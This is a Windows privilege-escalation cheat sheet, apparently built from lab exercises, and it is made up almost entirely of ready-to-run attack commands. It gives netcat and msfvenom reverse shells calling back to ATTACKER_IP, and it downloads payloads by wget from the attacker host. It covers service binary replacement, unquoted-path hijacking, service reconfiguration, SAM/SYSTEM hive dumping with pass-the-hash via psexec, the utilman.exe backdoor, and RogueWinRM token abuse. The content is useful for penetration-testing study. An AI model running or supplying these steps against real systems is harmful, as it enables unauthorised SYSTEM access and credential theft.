
Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services
## Basic Recon

Interesting paths :
```powershell
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# Web server
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

history :
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Saved credentials:
```powershell
cmdkey /list
```

```powershell
runas /savecred /user:admin cmd.exe
```

Recup Putty stored creds : 
```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

See what privilege you have :
```powershell
C:\> whoami /priv
```

## Scheduled Tasks
```powershell
schtasks #List scheduled tasks

# Get info for a task
schtasks /query /tn vulntask /fo list /v

# Run a task
schtasks /run /tn vulntask

# Display permissions
icacls c:\tasks\schtask.bat

c:\tasks\schtask.bat 
	NT AUTHORITY\SYSTEM:(I)(F) 
	BUILTIN\Administrators:(I)(F) 
	BUILTIN\Users:(I)(F)
```

If BUILTIN\\Users group has full access (F), we can modify `schtask.bat` to include a reverseshell.

```powershell
echo nc.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

## Services

Get info for apphostsvc service
```powershell
C:\> sc qc apphostsvc 
[SC] QueryServiceConfig SUCCESS 

	SERVICE_NAME: apphostsvc 
	TYPE : 20 WIN32_SHARE_PROCESS 
	START_TYPE : 2 AUTO_START 
	ERROR_CONTROL : 1 NORMAL 
	BINARY_PATH_NAME : C:\Windows\system32\svchost.exe -k apphost 
	LOAD_ORDER_GROUP : 
	TAG : 0 
	DISPLAY_NAME : Application Host Helper Service 
	DEPENDENCIES : 
	SERVICE_START_NAME : localSystem
```

Get info for WindowsScheduler :
```powershell
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

Getting permissions : 
```powershell
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
    NT AUTHORITY\SYSTEM:(I)(F)
    BUILTIN\Administrators:(I)(F)
    BUILTIN\Users:(I)(RX)
    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
    APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

`Everyone` group has Modify (M) permissions so we can modify `WService.exe` 
```bash
# ATTACKER
# Generate reverse shell payload using metasploit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

python3 -m http.server

# Victim
C:\> cd C:\PROGRA~2\SYSTEM~1\
C:\> wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F

C:\> sc stop windowsscheduler 
C:\> sc start windowsscheduler
```


## Unquoted Service Paths

```powershell
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
    TYPE               : 10  WIN32_OWN_PROCESS
    START_TYPE         : 2   AUTO_START
    ERROR_CONTROL      : 0   IGNORE
    BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
    LOAD_ORDER_GROUP   :
    TAG                : 0
    DISPLAY_NAME       : VNC Server
    DEPENDENCIES       :
    SERVICE_START_NAME : LocalSystem
```

`"C:\Program Files\RealVNC\VNC Server\vncserver.exe"` not unquoted :(
```powershell
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
    TYPE               : 10  WIN32_OWN_PROCESS
    START_TYPE         : 2   AUTO_START
    ERROR_CONTROL      : 0   IGNORE
    BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
    LOAD_ORDER_GROUP   :
    TAG                : 0
    DISPLAY_NAME       : Disk Sorter Enterprise
    DEPENDENCIES       :
    SERVICE_START_NAME : .\svcusr2
```

`C:\MyPrograms\Disk Sorter`  unquoted !!!
`icacls C:\MyPrograms` -> if you have **AD** and **WD** privileges, create a revshell with metasploit called Disk.exe and place it at `C:\MyPrograms`
```
C:\> sc stop "disk sorter enterprise" 
C:\> sc start "disk sorter enterprise"
```

## Insecure Service Permissions

```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

BUILTIN Users has SERVICE_ALL_ACCESS on thmservice.
```bash
# ATTACKER
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
nc -lvp 4447
```

```powershell
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
C:\> sc stop THMService
C:\> sc start THMService
```

## Windows Privileges

Repo with privileges and if it is possible to leverage : [Priv2Admin](https://github.com/gtworek/Priv2Admin)

```powershell
C:\> whoami /priv
```

### SeBackup / SeRestore
```
C:\> reg save hklm\system 
C:\Users\THMBackup\system.hive The operation completed successfully. C:\> reg save hklm\sam 
C:\Users\THMBackup\sam.hive The operation completed successfully.
```

Exfiltrate `same.hive` and `system.hive` on the attacker machine and run : 
```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Take Administrator hash
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<VICTIM_IP>
```

### SeTakeOwnership

```powershell
C:\> takeown /f C:\Windows\System32\Utilman.exe
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
C:\Windows\System32\> copy cmd.exe utilman.exe
```
To trigger utilman, we will lock our screen from the start button and finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges.

### SeImpersonate / SeAssignPrimaryToken

```powershell
C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> <PORT>"
```

## Scripts

[PrivescCheck](https://github.com/itm4n/PrivescCheck)
[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

```powershell
winpeas.exe > outputfile.txt

Set-ExecutionPolicy Bypass -Scope process -Force 
. .\PrivescCheck.ps1 
Invoke-PrivescCheck
```

[Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
```bash
# Attacker machine
# systeminfo.txt is the command systeminfo ran on victim machine
wes.py systeminfo.txt 
```

## Metasploit
If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.


## Links
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Decoder's Blog](https://decoder.cloud/)
- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

